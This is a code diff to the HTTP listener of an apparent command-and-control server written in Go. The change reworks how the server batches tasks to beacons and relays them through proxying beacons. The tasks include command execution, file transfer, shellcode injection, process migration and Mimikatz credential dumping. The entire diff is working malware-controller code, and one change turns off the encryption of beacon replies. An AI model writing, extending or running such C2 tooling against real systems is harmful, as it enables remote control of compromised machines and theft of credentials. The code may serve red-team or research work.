@@ -3,7 +3,7 @@ package main
 import (
 	"io"
 	"os"
-//	"fmt"
+	"fmt"
 	"log"
 	"time"
 	"mime"
@@ -119,89 +119,157 @@ func (server HttpListener) beaconUploadHandler(w http.ResponseWriter, r *http.Re
 }
 
 func (server HttpListener) beaconGetHandler(w http.ResponseWriter, r *http.Request) {
-	var update CommandUpdate
-	data := mux.Vars(r)["data"]
-	respMap := make(map[string][]string)
-	decoded, _ := b64.StdEncoding.DecodeString(data)
-	json.Unmarshal(decoded, &update)
-	beacon := registerBeacon(update)
-	decodedData, _ := b64.StdEncoding.DecodeString(update.Data)
+	type BeaconMessages []BeaconMessage
 
-	respMap["exec"] = beacon.ExecBuffer
-	respMap["download"] = beacon.DownloadBuffer
-	respMap["upload"] = beacon.UploadBuffer
-	respMap["shellcode"] = beacon.ShellcodeBuffer
-	respMap["proxyclients"] = beacon.ProxyClientBuffer
+	dataArr := strings.Split(mux.Vars(r)["data"], ",")
+	beaconMessages := BeaconMessages{}
 
-	respData, _ := json.Marshal(respMap)
-	
-	message := BeaconMessage {
-		Route: []byte{0},//[]byte(beacon.Ip), for forwarding
-		Data: respData,
+	for _, data := range dataArr {
+		if len(dataArr) == 0 {
+			continue
+		}
+
+		var update CommandUpdate
+		respMap := make(map[string][]string)
+		decoded, _ := b64.StdEncoding.DecodeString(data)
+		json.Unmarshal(decoded, &update)
+		beacon := registerBeacon(update)
+		decodedData, _ := b64.StdEncoding.DecodeString(update.Data)
+
+		respMap["exec"] = beacon.ExecBuffer
+		respMap["download"] = beacon.DownloadBuffer
+		respMap["upload"] = beacon.UploadBuffer
+		respMap["shellcode"] = beacon.ShellcodeBuffer
+		respMap["proxyclients"] = beacon.ProxyClientBuffer
+
+		respData, _ := json.Marshal(respMap)
+		
+		beaconUpdates := []BeaconMessage{}
+
+		for _, client := range beacon.ProxyClients {
+			for _, b := range beacons {
+				bufferLen := len(b.ExecBuffer) + len(b.DownloadBuffer) + len(b.UploadBuffer) + len(b.ShellcodeBuffer) + len(b.ProxyClientBuffer)
+				if b.Id == client && bufferLen > 0 {
+					clientRespMap := make(map[string][]string)
+
+					clientRespMap["exec"] = b.ExecBuffer
+					clientRespMap["download"] = b.DownloadBuffer
+					clientRespMap["upload"] = b.UploadBuffer
+					clientRespMap["shellcode"] = b.ShellcodeBuffer
+					clientRespMap["proxyclients"] = b.ProxyClientBuffer
+				
+					b.ExecBuffer = nil
+					b.DownloadBuffer = nil
+					b.UploadBuffer = nil
+					b.ShellcodeBuffer = nil
+					b.ProxyClientBuffer = nil
+
+					clientRespData, _ := json.Marshal(clientRespMap)
+
+					clientTargetMessage := BeaconMessage {
+						Route: []byte{0},
+						Data: clientRespData,
+					}
+
+					clientTargetMessageEncoded, _ := json.Marshal(BeaconMessages{clientTargetMessage})
+
+					clientMessage := BeaconMessage {
+						Route: []byte(b.Id),
+						Data: clientTargetMessageEncoded,
+					}
+
+					beaconUpdates = append(beaconUpdates, clientMessage)
+				}
+			}	
+		}
+
+		message := BeaconMessage {
+			Route: []byte{0},//[]byte(beacon.Ip), for forwarding
+			Data: respData,
+		}
+		beaconUpdates = append(beaconUpdates, message)
+
+		for _, bu := range beaconUpdates {
+			beaconMessages = append(beaconMessages, bu)
+		}
+
+		beacon.ExecBuffer = nil
+		beacon.DownloadBuffer = nil
+		beacon.UploadBuffer = nil
+		beacon.ShellcodeBuffer = nil
+		beacon.ProxyClientBuffer = nil
+
+		if len(update.Data) > 0 {
+			if update.Type == "exec" {
+				out := strings.Replace(string(decodedData), "\n", "\n\t", -1)
+				info("\n[+] Beacon " + update.Id + "@" + update.Ip + " " + update.Type + ":")
+				info("\t" + out[:len(out)-1])
+			} else if update.Type == "upload" {
+				if(decodedData[0] == '1') {
+					f := strings.Split(string(decodedData), ";")
+					info("Uploaded file to " + beacon.Id + "@" + beacon.Ip + ":" + f[1])
+				} else if(decodedData[0] == '0') {
+					info("Failed to upload file to " + beacon.Id + "@" + beacon.Ip)
+				}
+			} else if update.Type == "quit" {
+				idx := -1
+				for i := 0; i < len(beacons); i++ {
+					if beacon == beacons[i] {
+						idx = i
+						webInterfaceUpdates = append(webInterfaceUpdates, &WebUpdate{"Beacon Exit", beacon.Id + "@" + beacon.Ip})
+						info("[+] Beacon " + beacon.Id + "@" + beacon.Ip + " has exited")
+						if activeBeacon == beacon {
+							activeBeacon = nil
+						}
+						break
+					}
+				}
+				if idx != -1 {
+					beacons = append(beacons[:idx], beacons[idx+1:]...)
+				}
+			} else if update.Type == "plist" {
+				info("[+] Beacon " + beacon.Id + "@" + beacon.Ip + " process list:")
+				data, _ := b64.StdEncoding.DecodeString(update.Data)
+				info(string(data))
+			} else if update.Type == "migrate" {
+				infof("[+] Beacon " + beacon.Id + "@" + beacon.Ip + " migrate: ")
+				data, _ := b64.StdEncoding.DecodeString(update.Data)
+				infof(string(data))
+
+				if string(data) == "Success" {
+					webInterfaceUpdates = append(webInterfaceUpdates, &WebUpdate{"Migrate success", beacon.Id + "@" + beacon.Ip})
+					info("! Beacon will exit - wait for callback from migrated process.")
+				} else {
+					info()
+				}
+			} else if update.Type == "mimikatz" {
+				info("[+] Mimikatz: ")
+				data, _ := b64.StdEncoding.DecodeString(update.Data)
+				infof(string(data))
+			} else if update.Type == "proxyConnectSuccess" {
+				decoded, _ = b64.StdEncoding.DecodeString(update.Data)
+
+				for _, client := range beacon.ProxyClients{
+					if client == string(decoded) {
+						return
+					}
+				}
+
+				info("[+] " + beacon.Id + "@" + beacon.Ip + " is now serving " + string(decoded))
+				beacon.ProxyClients = append(beacon.ProxyClients, string(decoded))
+			} else if update.Type == "proxyConnectFail" {
+				//info("[+] " + beacon.Id + "@" + beacon.Ip + " is now serving " + update.Data)
+			}
+			//prompt()
+		}
 	}
 
-	messageData, _ := json.Marshal(message)
-	messageEnc := securityContext.encrypt([]byte(messageData))
-	beaconMsg := b64.StdEncoding.EncodeToString(messageEnc)
+	messageData, _ := json.Marshal(beaconMessages)
+	fmt.Println(string(messageData))
+	//messageEnc := securityContext.encrypt([]byte(messageData))
+	beaconMsg := b64.StdEncoding.EncodeToString(messageData)//(messageEnc)
 
 	w.Write([]byte(beaconMsg))
-
-	beacon.ExecBuffer = nil
-	beacon.DownloadBuffer = nil
-	beacon.UploadBuffer = nil
-	beacon.ShellcodeBuffer = nil
-	beacon.ProxyClientBuffer = nil
-
-	if len(update.Data) > 0 {
-		if update.Type == "exec" {
-			out := strings.Replace(string(decodedData), "\n", "\n\t", -1)
-			info("\n[+] Beacon " + update.Id + "@" + update.Ip + " " + update.Type + ":")
-			info("\t" + out[:len(out)-1])
-		} else if update.Type == "upload" {
-			if(decodedData[0] == '1') {
-				f := strings.Split(string(decodedData), ";")
-				info("Uploaded file to " + beacon.Id + "@" + beacon.Ip + ":" + f[1])
-			} else if(decodedData[0] == '0') {
-				info("Failed to upload file to " + beacon.Id + "@" + beacon.Ip)
-			}
-		} else if update.Type == "quit" {
-			idx := -1
-			for i := 0; i < len(beacons); i++ {
-				if beacon == beacons[i] {
-					idx = i
-					webInterfaceUpdates = append(webInterfaceUpdates, &WebUpdate{"Beacon Exit", beacon.Id + "@" + beacon.Ip})
-					info("[+] Beacon " + beacon.Id + "@" + beacon.Ip + " has exited")
-					if activeBeacon == beacon {
-						activeBeacon = nil
-					}
-					break
-				}
-			}
-			if idx != -1 {
-				beacons = append(beacons[:idx], beacons[idx+1:]...)
-			}
-		} else if update.Type == "plist" {
-			info("[+] Beacon " + beacon.Id + "@" + beacon.Ip + " process list:")
-			data, _ := b64.StdEncoding.DecodeString(update.Data)
-			info(string(data))
-		} else if update.Type == "migrate" {
-			infof("[+] Beacon " + beacon.Id + "@" + beacon.Ip + " migrate: ")
-			data, _ := b64.StdEncoding.DecodeString(update.Data)
-			infof(string(data))
-
-			if string(data) == "Success" {
-				webInterfaceUpdates = append(webInterfaceUpdates, &WebUpdate{"Migrate success", beacon.Id + "@" + beacon.Ip})
-				info("! Beacon will exit - wait for callback from migrated process.")
-			} else {
-				info()
-			}
-		} else if update.Type == "mimikatz" {
-			info("[+] Mimikatz: ")
-			data, _ := b64.StdEncoding.DecodeString(update.Data)
-			infof(string(data))
-		}
-		prompt()
-	}
 }
 
 func (server HttpListener) beaconPostHandler(w http.ResponseWriter, r *http.Request) {
